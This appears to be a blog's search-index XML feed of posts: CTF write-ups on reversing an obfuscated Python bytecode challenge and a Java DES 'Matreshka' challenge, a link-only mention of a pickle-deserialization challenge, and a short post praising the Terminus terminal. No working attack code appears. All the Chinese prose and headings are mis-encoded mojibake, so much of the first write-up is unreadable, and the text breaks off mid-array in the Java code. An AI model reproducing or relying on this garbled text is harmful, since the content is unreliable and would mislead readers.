<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>ç½‘ç»œä¿¡æ¯å®‰å…¨ä¸“é¡¹èµ›_And_SUCTF</title>
      <link href="/2019/08/21/%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E4%B8%93%E9%A1%B9%E8%B5%9B-And-SuCtf/"/>
      <url>/2019/08/21/%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E4%B8%93%E9%A1%B9%E8%B5%9B-And-SuCtf/</url>
      
        <content type="html"><![CDATA[<p>è¿™æ®µæ—¶é—´ç©äº†ä¸€ä¸‹ç½‘ç»œä¸ä¿¡æ¯å®‰å…¨é¢†åŸŸä¸“é¡¹èµ›å’ŒSUCTFï¼Œå°±ç¨å¾®æ•´åˆä¸€ä¸‹ç›²åŒºã€‚ä¸¤åœºåæ¬¡éƒ½æ˜¯60+ï¼Œè™½ç„¶ä¸åƒä¹‹å‰çš„ç­¾åˆ°é€‰æ‰‹äº†ï¼Œä½†ä¹Ÿç¦»é¡¶å°–å·®å¾ˆè¿œå¾ˆè¿œã€‚</p><a id="more"></a><p>[TOC]</p><h1 id="ç½‘ç»œä¿¡æ¯å®‰å…¨ä¸“é¡¹èµ›"><a href="#ç½‘ç»œä¿¡æ¯å®‰å…¨ä¸“é¡¹èµ›" class="headerlink" title="ç½‘ç»œä¿¡æ¯å®‰å…¨ä¸“é¡¹èµ›"></a>ç½‘ç»œä¿¡æ¯å®‰å…¨ä¸“é¡¹èµ›</h1><p>è¿™ä¸ªæ¯”èµ›çš„<code>challenges</code>ç›¸å¯¹æ¥è¯´æ¯”è¾ƒç®€å•ï¼Œä»¥ä¸‹æ˜¯æˆ‘æ¯”è¾ƒæ„Ÿå…´è¶£çš„å‡ é¢˜ã€‚</p><h2 id="Pyäº¤æ˜“"><a href="#Pyäº¤æ˜“" class="headerlink" title="Pyäº¤æ˜“"></a>Pyäº¤æ˜“</h2><p>å‚è€ƒ<code>Nu1L wp</code>ï¼Œä»¥åŠ</p><p><a href="https://blog.csdn.net/q1uTruth/article/details/99634952" target="_blank" rel="noopener">https://blog.csdn.net/q1uTruth/article/details/99634952</a></p><p><a href="https://www.jianshu.com/p/10e6bc633938" target="_blank" rel="noopener">https://www.jianshu.com/p/10e6bc633938</a></p><p>ä¸€ä¸ªæ— æ³•åç¼–è¯‘çš„pycæ–‡ä»¶ï¼Œéœ€è¦ç¡¬åˆšå­—èŠ‚ç ã€‚å’±æ²¡æœ‰NU1Lçš„è‡ªå®šä¹‰IDA PROï¼Œåªèƒ½æ‰¾å·¥å…·å‡å°‘å·¥ä½œé‡ï¼š</p><p><a href="https://github.com/extremecoders-re/PjOrion-Deobfuscator" target="_blank" rel="noopener">https://github.com/extremecoders-re/PjOrion-Deobfuscator</a></p><p>æ ¹æ®æ­¤å·¥å…·å¯ç”Ÿæˆsvgæ ¼å¼çš„CFGå›¾ã€‚</p><p>å®˜æ–¹WPï¼š</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190821181518.png" alt=""></p><p>é€šè¿‡å¯¹<a href="https://github.com/python/cpython" target="_blank" rel="noopener">cpython</a>æºç çš„å®ç°è¿›è¡Œç†è§£ï¼Œå¯¹äº<code>PjOrion-Deobfuscator</code>æå–å‡ºæ¥çš„CFGå›¾ï¼Œå¯ä»¥å¼€å§‹ç¡¬åˆšä¸Šé¢çš„é€»è¾‘äº†ï¼š</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190821205232.png" alt=""></p><p>è·Ÿç€CFGå›¾èµ°ä¸€éå¯ä»¥çŸ¥é“å¼€å§‹æ˜¯å››ä¸ªåˆ—è¡¨èµ‹å€¼ï¼š</p><pre class=" language-python"><code class="language-python">a <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">13433</span><span class="token punctuation">,</span> <span class="token number">4747</span><span class="token punctuation">,</span> <span class="token number">17752</span><span class="token punctuation">,</span> <span class="token number">33060</span><span class="token punctuation">,</span> <span class="token number">31051</span><span class="token punctuation">,</span> <span class="token number">48809</span><span class="token punctuation">,</span> <span class="token number">29988</span><span class="token punctuation">,</span> <span class="token number">6421</span><span class="token punctuation">,</span> <span class="token number">20021</span><span class="token punctuation">,</span><span class="token number">38888</span><span class="token punctuation">,</span> <span class="token number">24844</span><span class="token punctuation">,</span> <span class="token number">20706</span><span class="token punctuation">,</span> <span class="token number">11713</span><span class="token punctuation">,</span> <span class="token number">34938</span><span class="token punctuation">,</span> <span class="token number">12865</span><span class="token punctuation">,</span> <span class="token number">6085</span><span class="token punctuation">,</span> <span class="token number">37391</span><span class="token punctuation">,</span> <span class="token number">32840</span><span class="token punctuation">,</span> <span class="token number">31964</span><span class="token punctuation">,</span> <span class="token number">27194</span><span class="token punctuation">,</span><span class="token number">8701</span><span class="token punctuation">,</span> <span class="token number">48142</span><span class="token punctuation">,</span> <span class="token number">27066</span><span class="token punctuation">,</span> <span class="token number">28626</span><span class="token punctuation">,</span> <span class="token number">37431</span><span class="token punctuation">,</span> <span class="token number">39142</span><span class="token punctuation">,</span> <span class="token number">46795</span><span class="token punctuation">,</span> <span class="token number">21771</span><span class="token punctuation">,</span> <span class="token number">44280</span><span class="token punctuation">,</span> <span class="token number">40628</span><span class="token punctuation">,</span> <span class="token number">35013</span><span class="token punctuation">,</span><span class="token number">18583</span><span class="token punctuation">,</span> <span class="token number">5418</span><span class="token punctuation">,</span> <span class="token number">4347</span><span class="token punctuation">,</span> <span class="token number">43929</span><span class="token punctuation">,</span> <span class="token number">9934</span><span class="token punctuation">,</span> <span class="token number">46892</span><span class="token punctuation">,</span> <span class="token number">19868</span><span class="token punctuation">]</span>b <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">13711</span><span class="token punctuation">,</span> <span class="token number">7074</span><span class="token punctuation">,</span> <span class="token number">79833</span><span class="token punctuation">,</span> <span class="token number">42654</span><span class="token punctuation">,</span> <span class="token number">23241</span><span class="token punctuation">,</span> <span class="token number">41412</span><span class="token punctuation">,</span> <span class="token number">61795</span><span class="token punctuation">,</span> <span class="token number">6373</span><span class="token punctuation">,</span> <span class="token number">19304</span><span class="token punctuation">,</span><span class="token number">1363</span><span class="token punctuation">,</span> <span class="token number">1682</span><span class="token punctuation">,</span> <span class="token number">66279</span><span class="token punctuation">,</span> <span class="token number">76134</span><span class="token punctuation">,</span> <span class="token number">60748</span><span class="token punctuation">,</span> <span class="token number">10355</span><span class="token punctuation">,</span> <span class="token number">63484</span><span class="token punctuation">,</span> <span class="token number">30491</span><span class="token punctuation">,</span> <span class="token number">34005</span><span class="token punctuation">,</span> <span class="token number">51393</span><span class="token punctuation">,</span> <span class="token number">38029</span><span class="token punctuation">,</span><span class="token number">7241</span><span class="token punctuation">,</span> <span class="token number">4998</span><span class="token punctuation">,</span> <span class="token number">18562</span><span class="token punctuation">,</span> <span class="token number">16935</span><span class="token punctuation">,</span> <span class="token number">66677</span><span class="token punctuation">,</span> <span class="token number">51321</span><span class="token punctuation">,</span> <span class="token number">13771</span><span class="token punctuation">,</span> <span class="token number">49108</span><span class="token punctuation">,</span> <span class="token number">52166</span><span class="token punctuation">,</span> <span class="token number">8851</span><span class="token punctuation">,</span> <span class="token number">16900</span><span class="token punctuation">,</span><span class="token number">31682</span><span class="token punctuation">,</span> <span class="token number">16684</span><span class="token punctuation">,</span> <span class="token number">12046</span><span class="token punctuation">,</span> <span class="token number">16764</span><span class="token punctuation">,</span> <span class="token number">64315</span><span class="token punctuation">,</span> <span class="token number">76742</span><span class="token punctuation">,</span> <span class="token number">14022</span><span class="token punctuation">]</span>c <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">832832835</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">924053193</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">307134635</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">527578092</span><span class="token punctuation">,</span> <span class="token number">998625960</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">715102211</span><span class="token punctuation">,</span> <span class="token number">3572182</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">963194083</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">475718185</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">361574731</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">678171563</span><span class="token punctuation">,</span><span class="token number">107566155</span><span class="token punctuation">,</span> <span class="token number">608670527</span><span class="token punctuation">,</span> <span class="token number">254218946</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">81206308</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">284228457</span><span class="token punctuation">,</span> <span class="token number">373369420</span><span class="token punctuation">,</span><span class="token number">659110852</span><span class="token punctuation">,</span> <span class="token number">165298084</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">389004184</span><span class="token punctuation">,</span> <span class="token number">893094421</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">868933443</span><span class="token punctuation">,</span> <span class="token number">44838205</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">98551062</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">59800920</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">575871298</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">748337118</span><span class="token punctuation">,</span> <span class="token number">696390966</span><span class="token punctuation">,</span> <span class="token number">427210246</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">266607884</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">555200820</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">594235119</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">233255094</span><span class="token punctuation">,</span> <span class="token number">229291711</span><span class="token punctuation">,</span> <span class="token number">711922719</span><span class="token punctuation">,</span><span class="token number">14476464</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">783373820</span><span class="token punctuation">,</span> <span class="token number">892608580</span><span class="token punctuation">]</span>e <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">973988289</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">867920193</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">132362266</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">172451190</span><span class="token punctuation">,</span> <span class="token number">1471255182</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">242282199</span><span class="token punctuation">,</span> <span class="token number">321870424</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">897049789</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">428663209</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">256350703</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">613466537</span><span class="token punctuation">,</span><span class="token number">321254055</span><span class="token punctuation">,</span> <span class="token number">641759727</span><span class="token punctuation">,</span> <span class="token number">344601346</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">40281788</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">217030057</span><span class="token punctuation">,</span> <span class="token number">476060216</span><span class="token punctuation">,</span><span class="token number">767746297</span><span class="token punctuation">,</span> <span class="token number">503093626</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">102198850</span><span class="token punctuation">,</span> <span class="token number">984358207</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">415480559</span><span class="token punctuation">,</span> <span class="token number">322813233</span><span class="token punctuation">,</span><span class="token number">178032672</span><span class="token punctuation">,</span> <span class="token number">48876640</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">467362638</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">260077296</span><span class="token punctuation">,</span> <span class="token number">923436845</span><span class="token punctuation">,</span> <span class="token number">536082660</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">138702820</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">210365307</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">397666023</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">215329942</span><span class="token punctuation">,</span> <span class="token number">274852104</span><span class="token punctuation">,</span> <span class="token number">818217684</span><span class="token punctuation">,</span><span class="token number">41479433</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">632022956</span><span class="token punctuation">,</span> <span class="token number">1204798830</span><span class="token punctuation">]</span></code></pre><p>å»ºç«‹åˆ—è¡¨ä¹‹åï¼Œæ¯”è¾ƒdå’Œeï¼Œå¦‚æœç›¸ç­‰åˆ™è°ƒç”¨p_så‡½æ•°å¯¹è±¡ï¼Œä¸ç›¸ç­‰åˆ™è°ƒç”¨p_få‡½æ•°å¯¹è±¡ï¼Œåœ¨æˆ‘ä»¬ç”¨marshlå¾—åˆ°çš„ä¿¡æ¯ä¸­å¯ä»¥çŸ¥é“p_så’Œp_fçš„é€»è¾‘ï¼Œåœ¨æ­¤é¢˜ä¸­p_så’Œp_fåªæ˜¯ä¸¤ä¸ªæ‰“å°çš„å‡½æ•°è€Œå·²ã€‚</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190822110511.png" alt=""></p><p>é€šè¿‡åˆ†æå¾—åˆ°då’Œeçš„å…³ç³»ï¼š</p><pre class=" language-py"><code class="language-py">d.append(a[i]*data[i]*data[i] + b[i]*data[i])</code></pre><p>å¯ä»¥æ‹Ÿä»¥ä¸‹å‡½æ•°ï¼Œå…¶ä¸­xä¸­ä¸ºéšä¾¿èµ‹çš„å€¼ï¼Œç„¶åé€šè¿‡disæ¨¡å—æ‰“å°å­—èŠ‚ç ï¼Œä»¥ä¾¿å°†é€»è¾‘çœ‹çš„æ›´ä¸ºæ¸…æ™°ï¼Œ<code>æœ¬é¢˜è¦æ±‚çš„å³ä¸ºflag==&gt;x[]</code>ï¼š</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190822140847.png" alt=""></p><p><code>import dis;dis.dis(get):</code></p><pre class=" language-python"><code class="language-python">            <span class="token number">597</span> STORE_FAST               <span class="token number">4</span> <span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token number">25</span>         <span class="token number">600</span> BUILD_LIST               <span class="token number">0</span>            <span class="token number">603</span> STORE_FAST               <span class="token number">5</span> <span class="token punctuation">(</span>d<span class="token punctuation">)</span> <span class="token number">26</span>         <span class="token number">606</span> SETUP_LOOP              <span class="token number">77</span> <span class="token punctuation">(</span>to <span class="token number">686</span><span class="token punctuation">)</span>            <span class="token number">609</span> LOAD_GLOBAL              <span class="token number">0</span> <span class="token punctuation">(</span>range<span class="token punctuation">)</span>            <span class="token number">612</span> LOAD_CONST             <span class="token number">191</span> <span class="token punctuation">(</span><span class="token number">38</span><span class="token punctuation">)</span>            <span class="token number">615</span> CALL_FUNCTION            <span class="token number">1</span>            <span class="token number">618</span> GET_ITER                    <span class="token operator">>></span>  <span class="token number">619</span> FOR_ITER                <span class="token number">63</span> <span class="token punctuation">(</span>to <span class="token number">685</span><span class="token punctuation">)</span>            <span class="token number">622</span> STORE_FAST               <span class="token number">6</span> <span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token number">27</span>         <span class="token number">625</span> LOAD_FAST                <span class="token number">5</span> <span class="token punctuation">(</span>d<span class="token punctuation">)</span>            <span class="token number">628</span> LOAD_ATTR                <span class="token number">1</span> <span class="token punctuation">(</span>append<span class="token punctuation">)</span>            <span class="token number">631</span> LOAD_FAST                <span class="token number">0</span> <span class="token punctuation">(</span>a<span class="token punctuation">)</span>            <span class="token number">634</span> LOAD_FAST                <span class="token number">6</span> <span class="token punctuation">(</span>i<span class="token punctuation">)</span>            <span class="token number">637</span> BINARY_SUBSCR                   <span class="token number">638</span> LOAD_FAST                <span class="token number">4</span> <span class="token punctuation">(</span>x<span class="token punctuation">)</span>            <span class="token number">641</span> LOAD_FAST                <span class="token number">6</span> <span class="token punctuation">(</span>i<span class="token punctuation">)</span>            <span class="token number">644</span> BINARY_SUBSCR                   <span class="token number">645</span> BINARY_MULTIPLY                 <span class="token number">646</span> LOAD_FAST                <span class="token number">4</span> <span class="token punctuation">(</span>x<span class="token punctuation">)</span>            <span class="token number">649</span> LOAD_FAST                <span class="token number">6</span> <span class="token punctuation">(</span>i<span class="token punctuation">)</span>            <span class="token number">652</span> BINARY_SUBSCR                   <span class="token number">653</span> BINARY_MULTIPLY                 <span class="token number">654</span> LOAD_FAST                <span class="token number">1</span> <span class="token punctuation">(</span>b<span class="token punctuation">)</span>            <span class="token number">657</span> LOAD_FAST                <span class="token number">6</span> <span class="token punctuation">(</span>i<span class="token punctuation">)</span>            <span class="token number">660</span> BINARY_SUBSCR                   <span class="token number">661</span> LOAD_FAST                <span class="token number">4</span> <span class="token punctuation">(</span>x<span class="token punctuation">)</span>            <span class="token number">664</span> LOAD_FAST                <span class="token number">6</span> <span class="token punctuation">(</span>i<span class="token punctuation">)</span>            <span class="token number">667</span> BINARY_SUBSCR                   <span class="token number">668</span> BINARY_MULTIPLY                 <span class="token number">669</span> BINARY_ADD                      <span class="token number">670</span> LOAD_FAST                <span class="token number">2</span> <span class="token punctuation">(</span>c<span class="token punctuation">)</span>            <span class="token number">673</span> LOAD_FAST                <span class="token number">6</span> <span class="token punctuation">(</span>i<span class="token punctuation">)</span>            <span class="token number">676</span> BINARY_SUBSCR                   <span class="token number">677</span> BINARY_ADD                      <span class="token number">678</span> CALL_FUNCTION            <span class="token number">1</span>            <span class="token number">681</span> POP_TOP                         <span class="token number">682</span> JUMP_ABSOLUTE          <span class="token number">619</span>        <span class="token operator">>></span>  <span class="token number">685</span> POP_BLOCK           </code></pre><p>å¯ä»¥çœ‹åˆ°ä¸CFGå›¾ä¸­çš„é€»è¾‘åŸºæœ¬ä¸€è‡´ï¼Œåªæ˜¯å°‘äº†å¾ˆå¤šä¸å¿…è¦çš„è·³è½¬ï¼Œæ­¤é¢˜åŸºæœ¬åˆ°æ­¤ç»“æŸã€‚</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190822143309.png" alt=""></p><h1 id="SUCTF"><a href="#SUCTF" class="headerlink" title="SUCTF"></a>SUCTF</h1><h2 id="guess-game"><a href="#guess-game" class="headerlink" title="guess_game"></a>guess_game</h2><p>æ­¤é¢˜æ˜¯ä¸€ä¸ªpickleååºåˆ—åŒ–çš„é¢˜ç›®ï¼Œè™½ç„¶æœ‰æ€è·¯ï¼Œä½†æ˜¯è‹¦äºä¸çŸ¥é“å¦‚ä½•æ‰‹å·¥æ„é€ payloadã€‚</p><p>çœ‹wpåï¼š</p><p><a href="https://github.com/rmb122/suctf2019_guess_game/tree/master/writeup" target="_blank" rel="noopener">https://github.com/rmb122/suctf2019_guess_game/tree/master/writeup</a></p><p><a href="https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html</a></p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190822171000.png" class="lazyload"></p><p>ä»åº•å±‚å»ç†è§£ä¸€é—¨è¯­è¨€çœŸçš„tqlï¼Œorzâ€¦ğŸ˜„</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Write_up </tag>
            
            <tag> bytecode </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Awesome_Terminal</title>
      <link href="/2019/07/23/Awesome-Terminal/"/>
      <url>/2019/07/23/Awesome-Terminal/</url>
      
        <content type="html"><![CDATA[<p>This page is to show a good terminal named â€œTerminusâ€ğŸ˜â€¦</p><a id="more"></a><h1 id="Terminus"><a href="#Terminus" class="headerlink" title="Terminus"></a>Terminus</h1><p>It is an open source projectâ€¦Until now already possess over ten thousands starsâ€¦</p><p>Here is a flyer page:</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190723183221.png" alt=""></p><p>And mine look as follow:</p><hr><p><code>Home page</code>:</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190723183348.png" alt=""></p><p><code>SSH page</code>:</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190723183525.png" alt=""></p><p>It is really awesome! As you can seeğŸ˜„.</p>]]></content>
      
      
      <categories>
          
          <category> tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tools </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Cybrics_Matreshka_Reverse</title>
      <link href="/2019/07/22/Cybrics-Matreshka-Reverse/"/>
      <url>/2019/07/22/Cybrics-Matreshka-Reverse/</url>
      
        <content type="html"><![CDATA[<p>I try to play the Cybrics CTF yesterdayğŸ˜€â€¦And the truth tell me that how suck i amâ€¦ Btwâ€¦The challenges of Cybrics is very interesting and fresh.</p><a id="more"></a><h1 id="Cybrics-Matreshka-Reverse"><a href="#Cybrics-Matreshka-Reverse" class="headerlink" title="Cybrics_Matreshka_Reverse"></a>Cybrics_Matreshka_Reverse</h1><blockquote><p>CyBRICS is a computer security competition (CTF) organized in a cross-university effort by BRICS countries academia.</p><p>The event is organized by CyBRICS coordinating universities: <a href="https://en.itmo.ru/en/" target="_blank" rel="noopener">ITMO University</a> (RU), <a href="http://en.scu.edu.cn/" target="_blank" rel="noopener">SiChuan University</a> (CN), <a href="https://www.nitw.ac.in/" target="_blank" rel="noopener">NIT Warangal</a> (IN), <a href="http://www.iitkgp.ac.in/" target="_blank" rel="noopener">IIT Kharagpur</a> (IN), <a href="https://www.wits.ac.za/" target="_blank" rel="noopener">Wits University</a> (ZA), <a href="https://www.tut.ac.za/" target="_blank" rel="noopener">Tshwane University of Technology</a> (ZA).</p><p>The competition is made and run by <a href="https://vk.com/spbctf" target="_blank" rel="noopener">SPbCTF</a> meetups crew (members of CTF teams LCâ†¯BC, SiBears, PeterPEN, Yozik).</p></blockquote><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190722151354.png" alt=""></p><h2 id="Challenge-Matreshka"><a href="#Challenge-Matreshka" class="headerlink" title="Challenge_Matreshka"></a>Challenge_Matreshka</h2><p>Although it is easy for most individuals, i think itâ€™s valuable.</p><p>appendix: <code>Code2.class</code> and <code>data2.bin</code></p><h2 id="Step1-Java-analysis"><a href="#Step1-Java-analysis" class="headerlink" title="Step1: Java analysis"></a>Step1: Java analysis</h2><p>You can get the source code from Code2.class by the <code>jd-gui</code> or other tools like it.</p><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>File<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>FileInputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>FileOutputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>PrintStream<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>crypto<span class="token punctuation">.</span>Cipher<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>crypto<span class="token punctuation">.</span>SecretKey<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>crypto<span class="token punctuation">.</span>SecretKeyFactory<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>crypto<span class="token punctuation">.</span>spec<span class="token punctuation">.</span>DESKeySpec<span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Code2</span><span class="token punctuation">{</span>  <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">decode</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> paramArrayOfByte<span class="token punctuation">,</span> String paramString<span class="token punctuation">)</span>    <span class="token keyword">throws</span> Exception  <span class="token punctuation">{</span>    SecretKeyFactory localSecretKeyFactory <span class="token operator">=</span> SecretKeyFactory<span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"DES"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arrayOfByte1 <span class="token operator">=</span> paramString<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    DESKeySpec localDESKeySpec <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DESKeySpec</span><span class="token punctuation">(</span>arrayOfByte1<span class="token punctuation">)</span><span class="token punctuation">;</span>    SecretKey localSecretKey <span class="token operator">=</span> localSecretKeyFactory<span class="token punctuation">.</span><span class="token function">generateSecret</span><span class="token punctuation">(</span>localDESKeySpec<span class="token punctuation">)</span><span class="token punctuation">;</span>    Cipher localCipher <span class="token operator">=</span> Cipher<span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"DES"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    localCipher<span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> localSecretKey<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arrayOfByte2 <span class="token operator">=</span> localCipher<span class="token punctuation">.</span><span class="token function">doFinal</span><span class="token punctuation">(</span>paramArrayOfByte<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> arrayOfByte2<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">encode</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> paramArrayOfByte<span class="token punctuation">,</span> String paramString<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>    SecretKeyFactory localSecretKeyFactory <span class="token operator">=</span> SecretKeyFactory<span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"DES"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arrayOfByte1 <span class="token operator">=</span> paramString<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    DESKeySpec localDESKeySpec <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DESKeySpec</span><span class="token punctuation">(</span>arrayOfByte1<span class="token punctuation">)</span><span class="token punctuation">;</span>    SecretKey localSecretKey <span class="token operator">=</span> localSecretKeyFactory<span class="token punctuation">.</span><span class="token function">generateSecret</span><span class="token punctuation">(</span>localDESKeySpec<span class="token punctuation">)</span><span class="token punctuation">;</span>    Cipher localCipher <span class="token operator">=</span> Cipher<span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"DES"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    localCipher<span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> localSecretKey<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arrayOfByte2 <span class="token operator">=</span> localCipher<span class="token punctuation">.</span><span class="token function">doFinal</span><span class="token punctuation">(</span>paramArrayOfByte<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> arrayOfByte2<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> paramArrayOfString<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>    String str <span class="token operator">=</span> <span class="token string">"matreha!"</span><span class="token punctuation">;</span>    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arrayOfByte1 <span class="token operator">=</span> <span class="token function">encode</span><span class="token punctuation">(</span>System<span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"user.name"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> str<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arrayOfByte2 <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token number">76</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">99</span><span class="token punctuation">,</span> <span class="token number">37</span><span class="token punctuation">,</span> <span class="token number">75</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">68</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">52</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">92</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token 